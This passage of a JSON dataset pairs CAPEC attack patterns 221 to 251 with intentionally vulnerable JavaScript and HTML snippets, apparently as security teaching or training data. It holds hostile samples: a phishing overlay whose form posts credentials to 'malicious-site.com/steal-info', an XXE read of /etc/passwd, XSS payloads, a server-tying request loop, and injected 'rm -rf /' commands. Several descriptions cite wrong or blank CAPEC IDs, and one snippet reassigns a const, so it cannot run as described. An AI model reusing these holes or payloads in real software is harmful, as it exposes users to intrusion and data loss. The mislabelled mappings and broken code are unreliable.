        "description": "This JavaScript code snippet demonstrates a client-server communication using raw sockets, which is a bad practice in J2EE applications (CWE-246). The client connects to a server and uses a weak authentication mechanism ('AUTH PLAIN weakpassword'), representing the selection of a less-secure algorithm during negotiation (CWE-757). The code also includes a potential replay attack vulnerability (CWE-294), where the client re-sends the authentication message upon receiving an 'AUTH_SUCCESS' response. This snippet embodies the main idea of CAPEC-272 (Client-Server Protocol Manipulation) by showcasing how an adversary can exploit weaknesses in the communication protocol to perform unexpected actions."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(express.text());\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  const parser = new xml2js.Parser({\n    explicitEntity: true\n  });\n\n  parser.parseString(xml, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    // Process the parsed XML\n    res.send('XML processed');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request to the '/upload' endpoint. The XML data is parsed using the xml2js library with the 'explicitEntity' option enabled, which allows for the processing of XML entities. This setup is vulnerable to a Data Serialization External Entities Blowup attack (CAPEC-). An attacker could craft an XML payload with external entities that reference large or resource-intensive URIs, potentially leading to a denial of service. The code also touches on related CWEs: CWE-611 (Improper Restriction of XML External Entity Reference) by not restricting external entities, CWE-99 (Improper Control of Resource Identifiers) by not validating the input URIs, and CWE-646 (Reliance on File Name or Extension) by implicitly trusting the XML content type."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "<html>\n<head>\n  <title>Vulnerable Page</title>\n</head>\n<body>\n  <iframe src=\"https://trusted-site.com\" style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0.5; z-index:2;\"></iframe>\n  <div style=\"position:absolute; top:0; left:0; width:100%; height:100%; z-index:1;\">\n    <h1>Welcome to FakeBank</h1>\n    <form action=\"https://malicious-site.com/steal-info\" method=\"post\">\n      <label for=\"username\">Username:</label>\n      <input type=\"text\" id=\"username\" name=\"username\"><br>\n      <label for=\"password\">Password:</label>\n      <input type=\"password\" id=\"password\" name=\"password\"><br>\n      <input type=\"submit\" value=\"Login\">\n    </form>\n  </div>\n</body>\n</html>",
        "description": "This code snippet demonstrates an iFrame overlay attack. The main idea is to trick the user into interacting with a malicious form while they believe they are interacting with a trusted site. The iFrame from 'trusted-site.com' is overlaid with partial transparency, making it appear as though the user is interacting with the trusted site, while the actual form submission goes to 'malicious-site.com'. This leverages CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) by not properly restricting the iFrame, CWE-451 (User Interface Misrepresentation of Critical Information) by spoofing the UI, and CWE-79 (Cross-site Scripting) by potentially allowing script injection in the form fields."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/version') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Server Version: 1.0.0\\n');\n  } else if (req.url === '/debug') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Debug Mode: ON\\n');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found\\n');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. The server responds to specific URLs with sensitive information. When a request is made to '/version', it reveals the server version. When a request is made to '/debug', it indicates that debug mode is on. This embodies the main idea of CAPEC-170 (Fingerprinting) by exposing sensitive system information (CWE-200, CWE-497) and potentially allowing an attacker to identify the system and its configuration. The exposure of such information can enable further attacks by revealing weaknesses in the system."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\napp.get('/dashboard', (req, res) => {\n  const sessionCookie = req.cookies.sessionID;\n  if (sessionCookie) {\n    // Assume the session ID is valid without validation\n    res.send('Welcome to your dashboard!');\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that relies on cookies for session management. The '/dashboard' route checks for the presence of a 'sessionID' cookie and grants access to the dashboard if the cookie exists, without validating the session ID. This embodies the main idea of CAPEC-61: 'Session Credential Falsification through Manipulation'. The code is vulnerable to CWE-565 (Reliance on Cookies without Validation and Integrity Checking) because it assumes the session ID is valid without proper validation. It also touches on CWE-472 (External Control of Assumed-Immutable Web Parameter) as the session ID can be manipulated by an attacker. Additionally, it is susceptible to CWE-384 (Session Fixation) and CWE-613 (Insufficient Session Expiration) since it does not handle session expiration or invalidation properly."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/resource',\n  method: 'GET'\n};\n\nfunction engageResource() {\n  const req = http.request(options, res => {\n    res.on('data', chunk => {});\n    res.on('end', () => {\n      // Re-engage the resource immediately after the response ends\n      engageResource();\n    });\n  });\n\n  req.on('error', error => {\n    console.error(error);\n  });\n\n  req.end();\n}\n\n// Start engaging the resource\nengageResource();",
        "description": "This JavaScript code snippet demonstrates a sustained client engagement attack on a target server. The code repeatedly sends HTTP GET requests to a specific resource on the target server. Each time a response is received, the resource is immediately re-engaged by sending another request. This continuous engagement can tie up the server's resources, making them unavailable to legitimate users. The code embodies the main idea of CAPEC-Name: 'Sustained Client Engagement' by keeping the resource busy without crashing or flooding the server, thus avoiding detection. The related CWEs are represented by the lack of resource consumption control (CWE-400), absence of request throttling (CWE-770), and improper authorization checks (CWE-285)."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xmlData = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xmlData, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed XML:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a DTD Injection vulnerability using the xml2js library to parse an XML document. The XML data includes a malicious DTD that defines an external entity 'xxe' which references the system file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive system files. This example embodies the main idea of CAPEC-112 (DTD Injection) and highlights related weaknesses such as CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition)."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const parser = new xml2js.Parser();\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    // Simulate processing of the parsed XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library. The code is vulnerable to a 'Serialized Data Parameter Blowup' attack (CAPEC-230) because it does not impose any limits on the size or complexity of the XML data being parsed. This can lead to a denial of service condition where CPU resources are exhausted due to inefficient parsing of a large or complex XML payload. The code also touches on CWE-770 (Allocation of Resources Without Limits or Throttling) as it does not restrict the size of the XML data, and CWE-611 (Improper Restriction of XML External Entity Reference) as it does not disable external entity references, which could lead to further vulnerabilities."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "const xml2js = require('xml2js');\n\nconst xmlData = `\n<root>\n  <item>\n    <subitem>\n      <subsubitem>\n        <subsubsubitem>\n          <!-- Nested payloads continue -->\n        </subsubsubitem>\n      </subsubitem>\n    </subitem>\n  </item>\n</root>`;\n\nfunction parseXML(data) {\n  const parser = new xml2js.Parser();\n  parser.parseString(data, (err, result) => {\n    if (err) {\n      console.error('Error parsing XML:', err);\n      return;\n    }\n    console.log('Parsed XML:', result);\n  });\n}\n\nparseXML(xmlData);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC). The code uses the 'xml2js' library to parse an XML string that contains deeply nested elements. The lack of proper validation (CWE-20) and schema validation (CWE-112) can lead to excessive resource consumption (CWE-674, CWE-770) due to uncontrolled recursion. The deeply nested structure can cause the parser to consume significant memory and CPU resources, potentially leading to a denial of service. This example highlights the importance of validating and limiting the depth of nested structures in serialized data to prevent resource exhaustion attacks."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n    // CWE-770: No limit on the size of the data being received\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // CWE-112: No XML schema validation\n      // CWE-674: Potential for uncontrolled recursion in XML parsing\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify(result));\n    });\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests and processes XML data. The server reads the incoming data without imposing any size limits (CWE-770), which can lead to resource exhaustion if an oversized payload is sent. The XML data is then parsed without any schema validation (CWE-112), making it vulnerable to maliciously crafted XML. Additionally, the XML parser may be susceptible to uncontrolled recursion (CWE-674), which can further exhaust system resources. This code embodies the main idea of CAPEC-230, where an adversary can inject oversized serialized data payloads to exhaust system resources or execute arbitrary code."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "const userRole = 'guest';\n\nfunction performAdminTask() {\n  if (userRole !== 'admin') {\n    console.log('Access Denied: Insufficient Privileges');\n    return;\n  }\n  console.log('Admin task performed');\n}\n\nfunction elevatePrivileges() {\n  userRole = 'admin'; // Improper Privilege Management\n  console.log('Privileges elevated to admin');\n}\n\nelevatePrivileges();\nperformAdminTask();",
        "description": "This JavaScript code snippet demonstrates a privilege escalation vulnerability. Initially, the user role is set to 'guest'. The `performAdminTask` function checks if the user role is 'admin' before allowing the task to be performed. However, the `elevatePrivileges` function improperly changes the user role to 'admin' without proper authorization checks, representing CWE-269 (Improper Privilege Management). This allows a user with 'guest' privileges to escalate their privileges to 'admin' and perform actions they are not authorized to perform, embodying the main idea of CAPEC-Privilege Escalation."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// Incorrect Permission Assignment for Critical Resource (CWE-732)\nfs.chmodSync('/path/to/critical/resource', 0o777);\n\n// Execution with Unnecessary Privileges (CWE-250)\nexec('sudo some_privileged_command', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// Incorrect Use of Privileged APIs (CWE-648)\nexec('sudo another_privileged_command', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// Privilege Dropping / Lowering Errors (CWE-271)\nprocess.setuid(1000); // Attempt to drop privileges but may not be effective\n\n// Process Control (CWE-114)\nexec('some_command_from_untrusted_source', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates several security weaknesses that could lead to hijacking a privileged process. The code includes: 1) Incorrect Permission Assignment for a Critical Resource (CWE-732) by setting overly permissive permissions on a critical file. 2) Execution with Unnecessary Privileges (CWE-250) by running commands with 'sudo' unnecessarily. 3) Incorrect Use of Privileged APIs (CWE-648) by not properly handling privileged API calls. 4) Privilege Dropping / Lowering Errors (CWE-271) by attempting to drop privileges but potentially failing to do so securely. 5) Process Control (CWE-114) by executing a command from an untrusted source. These weaknesses collectively illustrate how an attacker could hijack a privileged process to execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\nlet sharedData = '';\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      sharedData = body; // CWE-1058: Unsafe non-final static storable\n      res.end('Data received');\n    });\n  } else if (req.method === 'GET') {\n    res.end(sharedData); // CWE-294: Potential for replay attack\n  }\n}).listen(8080);\n\n// IOCTL-like function with insufficient access control\nfunction performPrivilegedOperation() {\n  if (sharedData === 'admin') { // CWE-782: Insufficient access control\n    fs.writeFileSync('/etc/important_file', 'Sensitive data');\n  }\n}\n\nsetInterval(performPrivilegedOperation, 1000);",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST and GET requests. The server stores data received from POST requests in a shared variable `sharedData` and returns this data in response to GET requests. This setup is vulnerable to CWE-1058 as it uses a non-final static storable in a multi-threaded context, leading to potential race conditions. Additionally, the code is susceptible to CWE-294, as an attacker could replay POST requests to manipulate the shared data. The `performPrivilegedOperation` function simulates an IOCTL-like operation with insufficient access control (CWE-782), as it performs a privileged file write operation based on the value of `sharedData`, which can be manipulated by an attacker."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "const fs = require('fs');\n\nprocess.on('uncaughtException', (err) => {\n  console.log('Caught exception: ' + err);\n});\n\nfunction privilegedOperation() {\n  try {\n    // Simulate privileged operation\n    fs.readFileSync('/etc/shadow');\n  } catch (err) {\n    // Handle error\n    console.log('Error reading file: ' + err);\n  }\n}\n\nfunction unprivilegedOperation() {\n  // Simulate unprivileged operation\n  console.log('Unprivileged operation');\n}\n\n// Simulate hijacking by catching exception from privileged block\ntry {\n  privilegedOperation();\n} catch (err) {\n  console.log('Hijacked exception: ' + err);\n  unprivilegedOperation();\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an exception thrown from a privileged operation (reading the '/etc/shadow' file) is caught and handled in a way that could be exploited. The 'uncaughtException' handler logs any uncaught exceptions, which could expose sensitive information. The 'privilegedOperation' function simulates a privileged action that could fail, and the 'unprivilegedOperation' function represents a less sensitive action. By catching the exception from the privileged block and redirecting the flow to an unprivileged operation, the code illustrates the concept of hijacking a privileged thread of execution. This is related to CWE-391 (Unchecked Error Condition) as it shows how ignoring or improperly handling exceptions can lead to security vulnerabilities."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeNativeCode() {\n  // Unsafe JNI-like call to native code\n  exec('ls -la', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Simulate sandboxed environment\ntry {\n  executeNativeCode();\n} catch (e) {\n  console.error('Caught exception:', e);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker could escape a sandbox by calling native code. The `exec` function from the `child_process` module is used to execute a shell command (`ls -la`). This is analogous to using unsafe JNI in Java to call native C code, which can perform operations that are not allowed within the sandboxed environment. The code also includes basic error handling to capture and log any errors or sensitive information that might be exposed during execution. This example embodies the main idea of CAPEC-142: 'Escaping a Sandbox by Calling Code in Another Language', and highlights related weaknesses such as 'Protection Mechanism Failure' (CWE-693) and 'Direct Use of Unsafe JNI' (CWE-111)."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n  const parsedUrl = url.parse(req.url, true);\n  const pathname = parsedUrl.pathname;\n\n  // CWE-551: Authorization before parsing and canonicalization\n  if (!isAuthorized(req)) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-424: Improper Protection of Alternate Path\n  if (pathname === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\n\nfunction isAuthorized(req) {\n  // Simulate an authorization check\n  return req.headers['authorization'] === 'valid-token';\n}\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that demonstrates a vulnerability related to CAPEC's deprecated attack pattern. The server checks for authorization before fully parsing and canonicalizing the URL (CWE-551). This can allow an attacker to bypass authorization by manipulating the URL. Additionally, the code does not sufficiently protect alternate paths (CWE-424), as it only checks for a specific path ('/admin') without considering other potential paths that could lead to restricted functionality. The 'isAuthorized' function simulates an authorization check, but the order of operations and lack of comprehensive path protection make the server vulnerable."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "const isAuthenticated = localStorage.getItem('authToken') !== null;\n\nfunction accessSensitiveData() {\n  if (isAuthenticated) {\n    fetch('/sensitive-data')\n      .then(response => response.json())\n      .then(data => console.log(data));\n  } else {\n    console.log('Access denied. Please log in.');\n  }\n}\n\naccessSensitiveData();",
        "description": "This JavaScript code snippet demonstrates a vulnerability where client-side authentication is used to control access to sensitive data. The `isAuthenticated` variable is set based on the presence of an 'authToken' in the client's local storage. If the token is present, the client is considered authenticated and allowed to fetch sensitive data from the server. This approach is flawed because it relies solely on client-side checks, which can be easily bypassed by an attacker who modifies the client code or local storage. This embodies the main idea of the deprecated CAPEC related to subversion of authorization checks and highlights CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const filePath = req.url.substring(1); // Extract file path from URL\n\n  // CWE-20: Improper Input Validation\n  // CWE-99: Improper Control of Resource Identifiers\n  // CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input\n  // CWE-1289: Improper Validation of Unsafe Equivalence in Input\n  // CWE-913: Improper Control of Dynamically-Managed Code Resources\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('File not found');\n      res.end();\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.write(data);\n    res.end();\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on the URL path provided by the client. The code is vulnerable to Resource Injection attacks due to improper input validation (CWE-20). Specifically, it extracts the file path directly from the URL without validating it (CWE-99), allowing an attacker to specify arbitrary file paths. This can lead to unauthorized access to files outside the intended directory. Additionally, the code does not validate the index, position, or offset in the input (CWE-1285), nor does it check for unsafe equivalence in the input (CWE-1289). Finally, it improperly controls dynamically-managed code resources (CWE-913) by allowing unrestricted file access based on user input."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  // Vulnerable code: using eval with user input\n  try {\n    const result = eval(userInput);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Result: ' + result);\n  } catch (e) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Error: ' + e.message);\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It parses the URL to extract a query parameter named 'input' and then uses the 'eval' function to execute this user-provided input. This is a classic example of a code injection vulnerability (CAPEC-242) because it allows an attacker to execute arbitrary code on the server. The use of 'eval' with user input is highly dangerous and can lead to severe security issues. Additionally, this code snippet indirectly touches on CWE-477 (Use of Obsolete Function) as 'eval' is considered unsafe and its use is generally discouraged in modern JavaScript programming."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "const userInput = \"console.log('Hello, world!');\";\n\nfunction executeUserCode(code) {\n    eval(code);\n}\n\nexecuteUserCode(userInput);",
        "description": "This JavaScript code snippet demonstrates a code injection vulnerability. The `userInput` variable contains a string that represents code to be executed. The `executeUserCode` function takes this input and uses the `eval` function to execute it. The `eval` function is inherently dangerous because it executes the string as code, which can lead to code injection if the input is not properly sanitized. This snippet embodies the main idea of CAPEC-242 (Code Injection) and highlights CWE-94 (Improper Control of Generation of Code), CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component), and CWE-77 (Improper Neutralization of Special Elements used in a Command)."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Example</title>\n</head>\n<body>\n    <a href=\"#\" id=\"xssLink\">Click me</a>\n    <script>\n        // Simulate user input that is not properly sanitized\n        var userInput = '\" onmouseover=\"alert(\\'XSS Attack!\\')\"';\n        // Vulnerable code: directly inserting user input into an HTML attribute\n        document.getElementById('xssLink').setAttribute('href', 'javascript:void(0)' + userInput);\n    </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Cross-Site Scripting (XSS) attack targeting HTML attributes. The user input is not properly sanitized and is directly inserted into the 'href' attribute of an anchor tag. When the user hovers over the link, the malicious JavaScript code (alert('XSS Attack!')) is executed. This example embodies the main idea of CAPEC-86 and related CWEs, particularly CWE-83 (Improper Neutralization of Script in Attributes in a Web Page) and CWE-79 (Improper Neutralization of Input During Web Page Generation)."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "description": "This code snippet demonstrates a basic example of an XSS attack targeting URI placeholders. The anchor tag's href attribute contains a 'javascript:' URI scheme, which is a common vector for XSS attacks. When a user clicks on the link, the JavaScript code within the URI is executed, triggering an alert box. This example embodies the main idea of the CAPEC by exploiting the browser's ability to interpret 'javascript:' URIs as executable content. The related CWEs highlight the improper neutralization of script in attributes, which is the core issue exploited in this attack."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "const userInput = '<<script>alert(\"XSS\")</script>';\nconst sanitizedInput = userInput.replace(/<</g, '<');\ndocument.body.innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability to 'XSS Using Doubled Characters' as described in the CAPEC. The user input contains a doubled '<' character to bypass a naive input validation mechanism. The `replace` function attempts to sanitize the input by replacing '<<' with '<', but it fails to neutralize the script tag properly. As a result, the malicious script is executed when the sanitized input is inserted into the DOM using `innerHTML`. This example highlights the importance of robust input validation and proper neutralization of special characters to prevent XSS attacks."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "<html>\n<body>\n  <script>\n    // Incomplete denylist example\n    var userInput = \"<img src='x' onerror='alert(1)'>\";\n    var denylist = ['<script>', '</script>']; // Incomplete denylist\n    for (var i = 0; i < denylist.length; i++) {\n      userInput = userInput.replace(new RegExp(denylist[i], 'gi'), '');\n    }\n    document.write(userInput); // Vulnerable to XSS\n  </script>\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application that attempts to use a denylist-based approach to prevent XSS attacks. The denylist is incomplete, only filtering out '<script>' and '</script>' tags, but not other potential XSS vectors such as the 'onerror' attribute in an 'img' tag. This allows an attacker to inject a malicious 'img' tag with an 'onerror' event handler that executes JavaScript code, leading to a stored XSS vulnerability. The code highlights the CWE-692 (Incomplete Denylist to Cross-Site Scripting) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) weaknesses."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "const userInput = \"<script>alert('XSS');</script>\\0\";\nconst sanitizedInput = userInput.replace(/<|>|&|\\0/g, '');\ndocument.getElementById('output').innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can exploit improper neutralization of invalid characters to perform an XSS attack. The `userInput` variable contains a malicious script tag followed by a null character (`\\0`). The `sanitizedInput` variable attempts to sanitize the input by removing certain special characters (`<`, `>`, `&`, and `\\0`). However, the presence of the null character may cause the filter to stop processing, allowing the script tag to bypass the filter and be executed when inserted into the DOM. This represents the CAPEC's main idea of using invalid characters to bypass input filtering, leading to an XSS attack. The related CWEs provide additional context on the types of improper neutralization and encoding issues that can contribute to this vulnerability."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  // Vulnerable to command injection\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // Safe input\nexecuteCommand('&& rm -rf /'); // Malicious input",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an OS command (`ls ${userInput}`) without proper validation or sanitization. This allows an attacker to inject malicious commands, such as `&& rm -rf /`, which could lead to severe consequences like deleting critical files. The code embodies the main idea of CAPEC-88 (Command Injection) and related CWEs, highlighting the risks of improper neutralization of special elements and argument delimiters in command strings."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  exec(userInput, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nconst userInput = 'ls; rm -rf /'; // Malicious input\nexecuteCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and directly passes it to the `exec` function from the `child_process` module, which executes the input as an OS command. This is a classic example of CWE-77 and CWE-78, where improper neutralization of special elements in the input allows an attacker to inject and execute arbitrary commands. The provided example usage shows how a malicious user could exploit this vulnerability to execute harmful commands like `rm -rf /`, which could delete critical system files."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/xml', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    const userInput = result.user.input[0];\n    const query = `//users/user[name='${userInput}']`;\n    // Simulate an XML database query\n    const fakeXmlDatabase = `<users><user><name>admin</name><password>secret</password></user></users>`;\n    xml2js.parseString(fakeXmlDatabase, (err, db) => {\n      if (err) {\n        res.status(500).send('Server Error');\n        return;\n      }\n      const xpath = require('xpath'), dom = require('xmldom').DOMParser;\n      const doc = new dom().parseFromString(fakeXmlDatabase);\n      const nodes = xpath.select(query, doc);\n      if (nodes.length > 0) {\n        res.send(`User found: ${nodes[0].firstChild.data}`);\n      } else {\n        res.send('User not found');\n      }\n    });\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable Express.js application that processes XML input from users. The application uses the 'xml2js' library to parse incoming XML data and constructs an XPath query using user input without proper validation or neutralization. This can lead to an XML Injection vulnerability, where an attacker can manipulate the XPath query to access unauthorized data. The code highlights the risks associated with improper input validation (CWE-20), improper neutralization of special elements (CWE-74, CWE-91, CWE-707), and XPath Injection (CWE-643)."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLocalLibrary(libName) {\n  const libPath = path.join(__dirname, libName);\n  if (fs.existsSync(libPath)) {\n    return require(libPath);\n  } else {\n    throw new Error('Library not found');\n  }\n}\n\n// Example usage\ntry {\n  const myLib = loadLocalLibrary('vulnerableLib.js');\n  myLib.execute();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a Local Code Inclusion vulnerability. The `loadLocalLibrary` function attempts to load a local JavaScript file specified by `libName`. If the file exists, it is required and its functionality is executed. This can be exploited by an attacker to load arbitrary or malicious code from the local file system, especially if the attacker has previously placed a malicious file on the system. This snippet also touches on CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by loading code from potentially untrusted sources, and CWE-913 (Improper Control of Dynamically-Managed Code Resources) by dynamically requiring and executing code without proper validation."
    },
    {
        "capec_id": "252",
